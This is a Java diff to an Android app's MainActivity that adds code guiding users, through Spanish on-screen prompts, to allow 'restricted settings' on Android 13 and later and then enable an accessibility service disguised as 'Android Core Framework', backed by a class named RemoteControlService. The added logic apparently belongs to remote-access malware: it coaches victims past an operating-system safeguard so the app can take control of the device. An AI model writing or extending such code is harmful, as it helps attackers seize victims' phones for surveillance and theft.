@@ -264,6 +264,12 @@ public class MainActivity extends Activity {
             case REQUEST_CODE_ACCESSIBILITY:
                 checkStoragePermission();
                 break;
+            case REQUEST_CODE_APP_INFO:
+                // After allowing restricted settings, now go to accessibility
+                Toast.makeText(this, "Paso 2: Ahora activa 'Android Core Framework' en Accesibilidad", Toast.LENGTH_LONG).show();
+                Intent accIntent = new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS);
+                startActivityForResult(accIntent, REQUEST_CODE_ACCESSIBILITY);
+                break;
             case REQUEST_CODE_MANAGE_STORAGE:
                 checkBatteryOptimization();
                 break;
@@ -272,10 +278,21 @@ public class MainActivity extends Activity {
         }
     }
 
+    private static final int REQUEST_CODE_APP_INFO = 105;
+
     private void checkAccessibility() {
         if (!isAccessibilityServiceEnabled(this, RemoteControlService.class)) {
-            Intent intent = new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS);
-            startActivityForResult(intent, REQUEST_CODE_ACCESSIBILITY);
+            if (Build.VERSION.SDK_INT >= 33) {
+                // Android 13+: First need to allow restricted settings
+                Toast.makeText(this, "Paso 1: Toca los 3 puntos (⋮) arriba y selecciona 'Permitir ajustes restringidos'", Toast.LENGTH_LONG).show();
+                Intent intent = new Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS);
+                intent.setData(Uri.parse("package:" + getPackageName()));
+                startActivityForResult(intent, REQUEST_CODE_APP_INFO);
+            } else {
+                Toast.makeText(this, "Activa el servicio 'Android Core Framework' en Accesibilidad", Toast.LENGTH_LONG).show();
+                Intent intent = new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS);
+                startActivityForResult(intent, REQUEST_CODE_ACCESSIBILITY);
+            }
         } else {
             checkStoragePermission();
         }
